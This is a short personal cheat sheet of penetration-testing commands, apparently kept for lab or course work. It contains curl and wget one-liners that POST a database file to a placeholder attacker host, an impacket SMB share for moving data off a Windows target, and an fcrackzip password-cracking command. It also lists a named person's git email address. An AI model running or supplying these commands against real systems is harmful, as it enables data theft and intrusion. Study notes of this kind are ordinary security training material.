# Log into git on machine

```bash
git config --global user.name "Julian Johnson"
```

```bash
git config --global user.email "julian.johnson.10@outlook.com"
```



## Metasploit/Searchsploit Commands

### Run from meterpreter shell to run shell commands
`shell`

Print the path of an exploit
`searchsploit -p <exploit-id>`

**Data exfil!**
`curl -X POST --data-binary @/path/to/file.db http://ATTACKER_IP:8000`

`wget --method=POST --body-file=/path/to/file.db http://ATTACKER_IP:8000`

## Data exfiltration from Windows to Kali machine

`impacket-smbserver share . -smb2support` - Attack machine
`net use X: \\$ip\share` - Target machine

## SCP:

### Remote to local:

`scp -P2222 student@192.168.237.52:/home/student/navigating-code.exe .`

### Local to remote:

`scp bolt.db kali@192.168.1.100:/home/kali/`

## Cracking Passwords:

### Crack Zip Folders
`fcrackzip -v -u -D -p <path_to_wordlist> <path_to_zip>`